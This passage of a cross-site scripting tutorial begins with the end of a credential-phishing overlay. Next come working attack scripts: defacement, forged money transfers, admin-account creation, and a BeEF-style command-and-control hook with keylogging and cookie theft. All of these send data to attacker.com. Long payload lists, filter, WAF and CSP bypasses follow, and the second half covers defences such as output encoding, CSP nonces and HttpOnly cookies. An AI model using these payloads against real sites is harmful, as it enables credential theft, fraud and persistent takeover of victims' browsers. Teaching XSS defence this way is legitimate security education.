            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        ">
            <h2>Session Expired</h2>
            <p>Please log in again to continue</p>
            <form id="phishForm">
                <input type="text" name="username" placeholder="Username" style="
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                " required>
                <input type="password" name="password" placeholder="Password" style="
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                " required>
                <button type="submit" style="
                    width: 100%;
                    padding: 12px;
                    background: #007bff;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                ">Log In</button>
            </form>
        </div>
    </div>
`;

document.body.appendChild(overlay);

// Steal credentials when submitted
document.getElementById('phishForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = this.username.value;
    const password = this.password.value;
    
    // Send to attacker
    fetch('https://attacker.com/phish', {
        method: 'POST',
        body: JSON.stringify({ username, password, site: location.hostname })
    }).then(() => {
        // Show error and reload to hide attack
        alert('Login failed. Please try again.');
        location.reload();
    });
});
</script>
```

### Defacement

**Replace page content:**

```html
<script>
document.body.innerHTML = `
    <div style="
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        font-family: Arial, sans-serif;
        text-align: center;
    ">
        <div>
            <h1 style="font-size: 72px; margin: 0;">HACKED</h1>
            <p style="font-size: 24px;">Your site has been compromised</p>
            <p>Found and exploited by: [Attacker Name]</p>
        </div>
    </div>
`;
</script>
```

### Unauthorized actions (AJAX)

**Perform actions as victim:**

```html
<script>
// Example: Banking application

// 1. Get CSRF token (if on same page)
const csrfToken = document.querySelector('[name="csrf_token"]').value;

// 2. Transfer money
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({
        to_account: 'ATTACKER_ACCOUNT',
        amount: 10000,
        currency: 'USD'
    })
}).then(response => response.json())
  .then(data => {
      // Log success to attacker
      fetch('https://attacker.com/success', {
          method: 'POST',
          body: JSON.stringify(data)
      });
  });

// 3. Change email (for account recovery)
fetch('/api/profile/email', {
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({
        email: 'attacker@evil.com'
    })
});

// 4. Add attacker as admin (if victim is admin)
fetch('/api/users/create', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({
        username: 'attacker_admin',
        password: 'P@ssw0rd123!',
        role: 'administrator'
    })
});
</script>
```

### Browser exploitation framework (BeEF-style)

**Turn XSS into persistent control:**

```html
<script src="https://attacker.com/hook.js"></script>

<!-- hook.js content: -->
<script>
(function() {
    // Establish WebSocket connection to C2 server
    const ws = new WebSocket('wss://attacker.com/c2');
    
    ws.onopen = () => {
        // Send victim info
        ws.send(JSON.stringify({
            type: 'new_victim',
            url: location.href,
            cookie: document.cookie,
            userAgent: navigator.userAgent,
            screen: {width: screen.width, height: screen.height}
        }));
    };
    
    ws.onmessage = (event) => {
        const cmd = JSON.parse(event.data);
        
        switch(cmd.type) {
            case 'exec_js':
                // Execute arbitrary JavaScript
                eval(cmd.code);
                break;
                
            case 'screenshot':
                // Capture page screenshot
                html2canvas(document.body).then(canvas => {
                    ws.send(JSON.stringify({
                        type: 'screenshot',
                        data: canvas.toDataURL()
                    }));
                });
                break;
                
            case 'keylog_start':
                // Start keylogging
                document.addEventListener('keypress', e => {
                    ws.send(JSON.stringify({
                        type: 'keypress',
                        key: e.key
                    }));
                });
                break;
                
            case 'redirect':
                location.href = cmd.url;
                break;
                
            case 'inject_html':
                document.body.innerHTML += cmd.html;
                break;
        }
    };
    
    // Heartbeat to keep connection alive
    setInterval(() => {
        ws.send(JSON.stringify({type: 'ping'}));
    }, 30000);
})();
</script>
```

## XSS Contexts and Bypasses

### Context 1: HTML element context

**Injection between HTML tags:**

```html
<div>USER_INPUT</div>
<p>USER_INPUT</p>
<span>USER_INPUT</span>
```

**Standard payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

**Less common but effective:**
```html
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<table background="javascript:alert(1)">
```

### Context 2: HTML attribute context

**Inside quoted attribute:**
```html
<input value="USER_INPUT">
<img alt="USER_INPUT">
<a title="USER_INPUT">
```

**Breaking out of quotes:**
```html
Payload: " onmouseover="alert(1)
Result: <input value="" onmouseover="alert(1)">

Payload: " autofocus onfocus="alert(1)
Result: <input value="" autofocus onfocus="alert(1)">

Payload: "><script>alert(1)</script><input value="
Result: <input value=""><script>alert(1)</script><input value="">
```

**Unquoted attribute context:**
```html
<input value=USER_INPUT>

Payload: x onmouseover=alert(1)
Result: <input value=x onmouseover=alert(1)>

Payload: x autofocus onfocus=alert(1)
Result: <input value=x autofocus onfocus=alert(1)>
```

**Event handler attributes:**
```html
<!-- Any event handler can be used -->
onclick=alert(1)
ondblclick=alert(1)
onmousedown=alert(1)
onmouseover=alert(1)
onmouseout=alert(1)
onmousemove=alert(1)
onkeydown=alert(1)
onkeyup=alert(1)
onkeypress=alert(1)
onfocus=alert(1)
onblur=alert(1)
onload=alert(1)
onerror=alert(1)
onsubmit=alert(1)
onchange=alert(1)
oninput=alert(1)
```

### Context 3: JavaScript string context

**Inside script tags with string:**
```html
<script>
var search = 'USER_INPUT';
var name = "USER_INPUT";
</script>
```

**Breaking out of single quotes:**
```javascript
Payload: ';alert(1);//
Result: var search = '';alert(1);//';

Payload: ';alert(document.domain);//
Result: var search = '';alert(document.domain);//';
```

**Breaking out of double quotes:**
```javascript
Payload: ";alert(1);//
Result: var name = "";alert(1);//";
```

**Template literals (backticks):**
```javascript
<script>
var message = `USER_INPUT`;
</script>

Payload: ${alert(1)}
Result: var message = `${alert(1)}`;
```

**Multi-line breaking:**
```javascript
<script>
var data = 'USER_INPUT';
</script>

Payload: 
test'
alert(1)
//

Result:
var data = 'test'
alert(1)
//';
```

### Context 4: JavaScript code context

**Inside JavaScript without quotes:**
```javascript
<script>
var x = USER_INPUT;
</script>

Payload: 1;alert(1);//
Result: var x = 1;alert(1);//;
```

### Context 5: URL/href attribute context

**href and src attributes:**
```html
<a href="USER_INPUT">Click</a>
<iframe src="USER_INPUT">
```

**JavaScript protocol:**
```html
Payload: javascript:alert(1)
Result: <a href="javascript:alert(1)">

Payload: javascript:alert(document.domain)
Result: <a href="javascript:alert(document.domain)">
```

**Data URI:**
```html
Payload: data:text/html,<script>alert(1)</script>
Result: <a href="data:text/html,<script>alert(1)</script>">

Payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
(Base64 of <script>alert(1)</script>)
```

### Context 6: CSS context

**Style attribute:**
```html
<div style="USER_INPUT">
```

**CSS injection (limited):**
```html
Payload: background:red"></style><script>alert(1)</script><style>
Result: <div style="background:red"></style><script>alert(1)</script><style>">
```

**CSS expression (IE only - legacy):**
```css
background: expression(alert(1))
```

### Common filter bypasses

**Bypass 1: `<script>` tag filtering**

```html
<!-- If <script> is blocked -->

<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- Alternative tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>

<!-- Nested tags -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Null bytes (some parsers) -->
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- Newlines -->
<scr
ipt>alert(1)</scr
ipt>
```

**Bypass 2: `alert` function filtering**

```javascript
// If alert is blocked

// Window object
(alert)(1)
window['alert'](1)
window['al'+'ert'](1)
top['alert'](1)
self['alert'](1)
parent['alert'](1)
frames['alert'](1)

// String concatenation
window['al'+'ert'](1)
window[(/al/.source+/ert/.source)](1)

// Eval
eval('al'+'ert(1)')
eval(atob('YWxlcnQoMSk='))  // Base64

// Alternative functions
print()
confirm(1)
prompt(1)
console.log('XSS')

// Unicode escapes
\u0061lert(1)
\u0061\u006c\u0065\u0072\u0074(1)
```

**Bypass 3: Parentheses filtering**

```javascript
// If () are blocked

// Template literals
alert`1`
eval`alert\x281\x29`

// Throw/onerror
throw onerror=alert,'1'
throw onerror=eval,'=alert\x281\x29'

// Tagged templates
String.fromCharCode`120`  // Less useful

// Get property without parens (limited)
location='javascript:alert\x281\x29'
```

**Bypass 4: Quote filtering**

```javascript
// If quotes are blocked

// Backticks
alert`1`
fetch`//attacker.com`

// String.fromCharCode
alert(String.fromCharCode(88,83,83))

// Hex encoding
\x61lert\x28\x31\x29

// Unicode
\u0061lert\u0028\u0031\u0029

// HTML entities (in HTML context)
&quot; = "
&apos; = '
&#34; = "
&#39; = '
&#x22; = "
&#x27; = '
```

**Bypass 5: Angle brackets filtering**

```html
<!-- If < > are blocked in HTML -->

<!-- Use existing tags with event handlers -->
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="

<!-- If in href attribute -->
javascript:alert(1)
```

**Bypass 6: Space filtering**

```html
<!-- Alternatives to spaces -->

<!-- Tab -->
<img/src=x/onerror=alert(1)>

<!-- Newline -->
<img
src=x
onerror=alert(1)>

<!-- Form feed -->
<svg/onload=alert(1)>

<!-- Null byte (some contexts) -->
<svg\x00onload=alert(1)>
```

**Bypass 7: WAF/filter evasion techniques**

```html
<!-- Multiple encoding -->
%253Cscript%253E  (double URL encoding)

<!-- Mixed encoding -->
<scri%70t>alert(1)</scri%70t>

<!-- Unicode normalization -->
＜script＞alert(1)＜/script＞  (full-width characters)

<!-- Comment insertion -->
<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>

<!-- Null bytes -->
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- Mutation XSS (mXSS) -->
<noscript><style></noscript><img src=x onerror=alert(1)>

<!-- CRLF injection -->
%0d%0a<script>alert(1)</script>
```

## Content Security Policy (CSP)

### Understanding CSP

**Purpose:** HTTP response header that instructs browsers which resources are allowed to load and execute, providing defense-in-depth against XSS.

**How CSP works:**

```http
Server sends header:
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

Browser enforces:
✓ Allow: Scripts from same origin
✓ Allow: Scripts from https://trusted.com
✗ Block: Inline scripts (<script>alert(1)</script>)
✗ Block: Inline event handlers (onclick=)
✗ Block: eval()
✗ Block: Scripts from other domains
✗ Block: javascript: URLs
```

### CSP directives

**Common directives:**

```http
default-src:    Default for all resource types
script-src:     JavaScript sources
style-src:      CSS sources
img-src:        Image sources
connect-src:    XMLHttpRequest, fetch, WebSocket
font-src:       Font sources
object-src:     <object>, <embed>, <applet>
media-src:      <audio>, <video>
frame-src:      <iframe> sources
base-uri:       <base> element
form-action:    <form> action attribute
```

**Source values:**

```
'none':           Block all
'self':           Same origin only
'unsafe-inline':  Allow inline scripts/styles (dangerous!)
'unsafe-eval':    Allow eval() (dangerous!)
https:            Any HTTPS source
https://trusted.com:  Specific domain
'nonce-ABC123':   Script with matching nonce attribute
'strict-dynamic': Trust scripts loaded by trusted scripts
```

**Example CSP policies:**

**Strict CSP (recommended):**
```http
Content-Security-Policy: 
    default-src 'none';
    script-src 'self';
    style-src 'self';
    img-src 'self' https:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
```

**CSP with nonce (for inline scripts):**
```http
Content-Security-Policy: script-src 'nonce-r4nd0m123abc'

HTML:
<script nonce="r4nd0m123abc">
    // This script will execute
    console.log('Allowed');
</script>

<script>
    // This script will be blocked
    console.log('Blocked');
</script>
```

### CSP bypass techniques

**Bypass 1: Unsafe directives**

**Weak CSP:**
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

**Exploitation:**
```html
<!-- 'unsafe-inline' allows all inline scripts -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>

All work! CSP provides no XSS protection.
```

**Bypass 2: JSONP endpoints on whitelisted domains**

**CSP:**
```http
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

**If trusted-cdn.com has JSONP endpoint:**
```html
<script src="https://trusted-cdn.com/jsonp?callback=alert"></script>

<!-- trusted-cdn.com responds with: -->
alert({"data": "value"});

<!-- alert() executes with data as parameter -->
```

**Bypass 3: AngularJS sandbox (legacy)**

**CSP:**
```http
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com
```

**If application uses AngularJS:**
```html
<div ng-app>
    {{constructor.constructor('alert(1)')()}}
</div>

<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
```

**Bypass 4: Base tag injection**

**CSP:**
```http
Content-Security-Policy: script-src 'self'
```

**Exploit:**
```html
<base href="https://attacker.com/">

<!-- Now relative script sources load from attacker.com -->
<script src="/app.js"></script>
<!-- Loads https://attacker.com/app.js instead of legitimate origin -->
```

**Bypass 5: Dangling markup injection**

**When CSP blocks script execution but not injection:**

```html
<!-- Injected payload -->
<img src='https://attacker.com/capture?data=

<!-- Page contains sensitive data after injection point -->
<input type="hidden" name="csrf" value="abc123xyz789">

<!-- Browser sends (data captured via malformed tag): -->
GET /capture?data=%3Cinput%20type=%22hidden%22%20name=%22csrf%22%20value=%22abc123xyz789%22%3E
```

**Bypass 6: Script gadgets**

**Using existing JavaScript libraries:**

```html
<!-- If jQuery is loaded and whitelisted -->
<div data-role="button" data-action="alert(1)"></div>

<!-- Or using specific library features -->
<script src="https://whitelisted-cdn.com/jquery.js"></script>
<img src=x onerror="$.globalEval('alert(1)')">
```

### CSP reporting

**Monitor XSS attempts:**

```http
Content-Security-Policy: 
    default-src 'self';
    report-uri /csp-report
```

**Browser sends violation reports:**
```json
{
    "csp-report": {
        "document-uri": "https://example.com/page",
        "violated-directive": "script-src 'self'",
        "blocked-uri": "inline",
        "source-file": "https://example.com/page",
        "line-number": 42,
        "column-number": 15
    }
}
```

**Report-only mode (testing):**
```http
Content-Security-Policy-Report-Only: script-src 'self'

<!-- Doesn't block, only reports violations -->
<!-- Useful for testing before enforcement -->
```

## Prevention Strategies

### Defense Layer 1: Input validation

**Validate on arrival:**

```javascript
// Allowlist validation
function validateUsername(input) {
    // Only alphanumeric and underscore
    const pattern = /^[a-zA-Z0-9_]{3,20}$/;
    
    if (!pattern.test(input)) {
        throw new Error('Invalid username format');
    }
    
    return input;
}

// Type validation
function validateAge(input) {
    const age = parseInt(input, 10);
    
    if (isNaN(age) || age < 0 || age > 150) {
        throw new Error('Invalid age');
    }
    
    return age;
}

// Email validation
function validateEmail(input) {
    const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (!pattern.test(input)) {
        throw new Error('Invalid email format');
    }
    
    return input;
}
```

**Reject dangerous patterns:**

```javascript
function sanitizeInput(input) {
    // Reject obvious script patterns
    const dangerous = [
        /<script/i,
        /javascript:/i,
        /on\w+\s*=/i,  // Event handlers
        /<iframe/i,
        /<object/i,
        /<embed/i
    ];
    
    for (const pattern of dangerous) {
        if (pattern.test(input)) {
            throw new Error('Input contains potentially dangerous content');
        }
    }
    
    return input;
}
```

**Note:** Input validation alone is insufficient. Always encode output!

### Defense Layer 2: Output encoding (PRIMARY DEFENSE)

**HTML context encoding:**

**JavaScript/Node.js:**
```javascript
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// Usage
const userInput = '<script>alert(1)</script>';
const safe = escapeHtml(userInput);
// Result: &lt;script&gt;alert(1)&lt;&#x2F;script&gt;

res.send(`<div>${safe}</div>`);
// Renders as text: <script>alert(1)</script>
// Does not execute
```

**PHP:**
```php
<?php
$userInput = $_GET['name'];

// HTML context
$safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "<div>Hello, $safe!</div>";

// Alternative: htmlentities
$safe2 = htmlentities($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');
?>
```

**Python (Flask with Jinja2):**
```python
from flask import Flask, render_template, request
from markupsafe import escape

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    
    # Manual escaping
    safe_name = escape(name)
    
    # Or use template (auto-escaping enabled by default)
    return render_template('greet.html', name=name)

# Template: greet.html
# <div>Hello, {{ name }}!</div>
# Jinja2 automatically escapes {{ name }}
```

**Java:**
```java
import org.apache.commons.text.StringEscapeUtils;

public String displayUserInput(String userInput) {
    // HTML escaping
    String safe = StringEscapeUtils.escapeHtml4(userInput);
    
    return "<div>" + safe + "</div>";
}

// Or use JSTL in JSP
// <c:out value="${userInput}" />
```

**JavaScript context encoding:**

```javascript
function escapeJavaScript(unsafe) {
    return unsafe
        .replace(/\\/g, '\\\\')      // Backslash
        .replace(/'/g, "\\'")         // Single quote
        .replace(/"/g, '\\"')         // Double quote
        .replace(/\n/g, '\\n')        // Newline
        .replace(/\r/g, '\\r')        // Carriage return
        .replace(/\t/g, '\\t')        // Tab
        .replace(/\b/g, '\\b')        // Backspace
        .replace(/\f/g, '\\f')        // Form feed
        .replace(/</g, '\\x3c')       // Less than
        .replace(/>/g, '\\x3e')       // Greater than
        .replace(/&/g, '\\x26');      // Ampersand
}

// Usage
const userInput = "'; alert(1); //";
const safe = escapeJavaScript(userInput);

res.send(`<script>var name = '${safe}';</script>`);
// Result: var name = '\'; alert(1); //';
// String literal, not code execution
```

**URL context encoding:**

```javascript
const userInput = "javascript:alert(1)";

// URL encoding
const safe = encodeURIComponent(userInput);
// Result: javascript%3Aalert(1)

res.send(`<a href="/search?q=${safe}">Link</a>`);
// URL: /search?q=javascript%3Aalert(1)
// Treated as data, not executable
```

**CSS context encoding:**

```javascript
function escapeCSS(unsafe) {
    // Escape CSS special characters
    return unsafe.replace(/[^a-zA-Z0-9]/g, function(char) {
        return '\\' + char.charCodeAt(0).toString(16) + ' ';
    });
}
```

### Defense Layer 3: Framework auto-escaping

**React (automatic escaping):**

```jsx
function UserGreeting(props) {
    // props.name is automatically escaped
    return <div>Hello, {props.name}!</div>;
}

// Input: <script>alert(1)</script>
// Rendered: Hello, &lt;script&gt;alert(1)&lt;/script&gt;!
// Safe!

// DANGEROUS: Don't do this unless absolutely necessary
function UnsafeComponent(props) {
    // Bypasses React's protection
    return <div dangerouslySetInnerHTML={{__html: props.html}} />;
}
```

**Angular (automatic escaping):**

```typescript
import { Component } from '@angular/core';

@Component({
    selector: 'app-greeting',
    template: `
        <!-- Safe: Automatically escaped -->
        <div>{{ userInput }}</div>
        
        <!-- DANGEROUS: Bypasses sanitization -->
        <div [innerHTML]="userInput"></div>
    `
})
export class GreetingComponent {
    userInput = '<script>alert(1)</script>';
}
```

**Vue.js (automatic escaping):**

```vue
<template>
    <div>
        <!-- Safe: Automatically escaped -->
        {{ userInput }}
        
        <!-- DANGEROUS: Renders raw HTML -->
        <div v-html="userInput"></div>
    </div>
</template>

<script>
export default {
    data() {
        return {
            userInput: '<script>alert(1)</script>'
        };
    }
}
</script>
```

### Defense Layer 4: Content-Type headers

**Prevent MIME-type confusion:**

```javascript
app.use((req, res, next) => {
    // Prevent browsers from MIME-sniffing
    res.setHeader('X-Content-Type-Options', 'nosniff');
    next();
});

// JSON API responses
app.get('/api/data', (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.json({data: 'value'});
    // Browser won't execute as HTML even if contains script tags
});

// Plain text responses
app.get('/api/text', (req, res) => {
    res.setHeader('Content-Type', 'text/plain');
    res.send('Some text content');
    // Cannot execute as script
});
```

### Defense Layer 5: CSP implementation

**Implement strict CSP:**

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate unique nonce per request
    res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
    
    // Set CSP header
    res.setHeader(
        'Content-Security-Policy',
        `default-src 'none'; ` +
        `script-src 'nonce-${res.locals.cspNonce}' 'strict-dynamic'; ` +
        `style-src 'self'; ` +
        `img-src 'self' https:; ` +
        `font-src 'self'; ` +
        `connect-src 'self'; ` +
        `frame-ancestors 'none'; ` +
        `base-uri 'self'; ` +
        `form-action 'self';`
    );
    
    next();
});

app.get('/page', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Secure Page</title>
        </head>
        <body>
            <h1>Content</h1>
            
            <!-- Allowed: Has correct nonce -->
            <script nonce="${res.locals.cspNonce}">
                console.log('This executes');
            </script>
            
            <!-- Blocked: No nonce -->
            <script>
                console.log('This is blocked');
            </script>
            
            <!-- Blocked: Inline event handler -->
            <img src=x onerror="alert(1)">
        </body>
        </html>
    `);
});
```

### Defense Layer 6: HTTP-only cookies

**Prevent JavaScript cookie access:**

```javascript
// Set session cookie with HttpOnly flag
app.use(session({
    secret: 'secret-key',
    cookie: {
        httpOnly: true,      // Cannot access via document.cookie
        secure: true,         // Only sent over HTTPS
        sameSite: 'strict'   // CSRF protection
    }
}));

// Manual cookie setting
res.cookie('session', 'abc123', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000  // 1 hour
});

// Result:
// Even if XSS occurs, document.cookie doesn't include HttpOnly cookies
// Limits impact of session hijacking
```

### Complete secure implementation

```javascript
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// 1. Security headers (including XSS protection)
app.use(helmet());

// 2. CSP with nonces
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    
    res.setHeader(
        'Content-Security-Policy',
        `default-src 'self'; ` +
        `script-src 'nonce-${res.locals.nonce}' 'strict-dynamic'; ` +
        `style-src 'self' 'unsafe-inline'; ` +
        `img-src 'self' https: data:; ` +
        `font-src 'self'; ` +
        `connect-src 'self'; ` +
        `frame-ancestors 'none'; ` +
        `base-uri 'self'; ` +
        `form-action 'self';`
    );
    
    next();
});

// 3. Input validation
function validateInput(input, maxLength = 100) {
    if (typeof input !== 'string') {
        throw new Error('Input must be string');
    }
    
    if (input.length > maxLength) {
        throw new Error('Input too long');
    }
    
    return input;
}

// 4. Output encoding
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// 5. Secure endpoint example
app.get('/search', (req, res) => {
    try {
        // Validate input
        const query = validateInput(req.query.q || '', 200);
        
        // Encode for output
        const safeQuery = escapeHtml(query);
        
        // Perform search (implementation omitted)
        const results = performSearch(query);
        
        // Render with safe output
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Search Results</title>
            </head>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: ${safeQuery}</p>
                
                <div id="results">
                    ${results.map(r => `<div>${escapeHtml(r.title)}</div>`).join('')}
                </div>
                
                <script nonce="${res.locals.nonce}">
                    // Safe inline script with nonce
                    console.log('Results loaded');
                </script>
            </body>
            </html>
        `);
        
    } catch (err) {
        res.status(400).send('Invalid request');
    }
});

// 6. Secure session configuration
const session = require('express-session');

app.use(session({
    secret: process.env.SESSION_SECRET,
    name: 'sessionId',  // Don't use default name
    cookie: {
        httpOnly: true,
        secure: true,     // HTTPS only
        sameSite: 'strict',
        maxAge: 3600000
    },
    resave: false,
    saveUninitialized: false
}));

app.listen(3000, () => {
    console.log('Secure app running on port 3000');
});
```
